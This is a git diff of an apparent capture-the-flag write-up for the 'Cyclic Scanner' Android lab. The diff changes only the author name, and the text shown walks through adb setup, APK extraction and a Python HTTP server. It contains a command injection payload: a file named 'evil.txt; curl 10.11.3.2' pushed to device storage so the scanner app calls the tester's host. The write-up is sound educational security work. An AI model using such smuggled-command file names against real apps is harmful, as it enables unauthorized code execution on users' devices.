@@ -1,5 +1,5 @@
 ---
-author: pl4int3xt
+author: 0xbinder
 layout: post
 title: Lab - Cyclic Scanner
 date: '2024-07-04'
@@ -29,28 +29,28 @@ The app uses a switch to start the scanner which is a foreground service
 Let's download vpn file and use adb to connect to the lab
 
 ```shell
-pl4int3xt@archlinux ~> adb connect 10.11.1.1:5001 
+0xbinder@archlinux ~> adb connect 10.11.1.1:5001 
 connected to 10.11.1.1:5001
 ```
 
 Let's locate the third party apps installed with adb 
 
 ```shell
-pl4int3xt@archlinux ~> adb shell pm list packages -3
+0xbinder@archlinux ~> adb shell pm list packages -3
 package:com.mobilehackinglab.cyclicscanner
 ```
 
 Let's get the path of the cyclicscanner app
 
 ```shell
-pl4int3xt@archlinux ~> adb shell pm path com.mobilehackinglab.cyclicscanner
+0xbinder@archlinux ~> adb shell pm path com.mobilehackinglab.cyclicscanner
 package:/data/app/~~qM4I86KbSswb6BplSzhL0A==/com.mobilehackinglab.cyclicscanner-rtyKTMCcoKLT7WV1i1hWWA==/base.apk
 ```
 
 Let's pull the app for static analysis with jadxgui
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb pull /data/app/~~qM4I86KbSswb6BplSzhL0A==/com.mobilehackinglab.cyclicscanner-rtyKTMCcoKLT7WV1i1hWWA==/base.apk
+0xbinder@archlinux ~/D/mobile-hacking> adb pull /data/app/~~qM4I86KbSswb6BplSzhL0A==/com.mobilehackinglab.cyclicscanner-rtyKTMCcoKLT7WV1i1hWWA==/base.apk
 ```
 
 In the `AndroidManfest.xml` file the `MainActivity` is exported and we have a `ScanService` which is not exported.
@@ -161,14 +161,14 @@ public final boolean scanFile(File file) {
 
 Let's start a python server 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking [1]> sudo python -m http.server 80
+0xbinder@archlinux ~/D/mobile-hacking [1]> sudo python -m http.server 80
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:80/) ...
 ```
 
 Let's check our ip with the following command
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> ip a s tap0
+0xbinder@archlinux ~/D/mobile-hacking> ip a s tap0
 ```
 
 Next we need to create a file and name it `evil.txt; curl 10.11.3.2` with our `tap0` ip.
@@ -176,13 +176,13 @@ Next we need to create a file and name it `evil.txt; curl 10.11.3.2` with our `t
 Let's create the file in our machine
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> touch "evil.txt; curl 10.11.3.2"
+0xbinder@archlinux ~/D/mobile-hacking> touch "evil.txt; curl 10.11.3.2"
 ```
 
 Next we need to push it in the device storage
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb push "evil.txt; curl 10.11.3.2" /storage/emulated/0/
+0xbinder@archlinux ~/D/mobile-hacking> adb push "evil.txt; curl 10.11.3.2" /storage/emulated/0/
 ```
 
 Launching the scanner app we get this meaning the command injection worked successfully
